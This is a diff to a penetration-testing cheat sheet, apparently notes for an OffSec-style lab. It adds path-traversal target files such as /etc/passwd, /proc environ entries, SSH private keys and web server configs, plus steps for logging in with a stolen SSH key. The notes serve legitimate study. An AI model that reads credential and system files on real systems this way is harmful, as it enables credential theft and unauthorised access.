@@ -17,6 +17,7 @@
     - [endpoint](#endpoint)
 - [Initial Access](#initial-access)
   - [Path Traversal](#path-traversal)
+    - [id\_sa](#id_sa)
     - [LFI](#lfi)
   - [Webshell](#webshell)
   - [Reverse Shell](#reverse-shell)
@@ -194,14 +195,26 @@ katana -u http://
 # Initial Access
 https://github.com/swisskyrepo/PayloadsAllTheThings
 ## Path Traversal
+https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
 ```bash
 /etc/passwd
+
 /proc/self/cmdline
 /proc/1/cwd
 /proc/2/environ
+
 /home/offsec/.ssh/id_rsa
+/home/offsec/.ssh/authorized_keys
+
 /etc/nginx/nginx.conf
 /etc/nginx/modules-enabled/default.conf
+/opt/apache2/conf/httpd.conf
+/opt/apache/conf/httpd.conf
+```
+### id_sa
+```bash
+chmod 400 id_key
+ssh -i id_key -p 2222
 ```
 ### LFI
 ```php
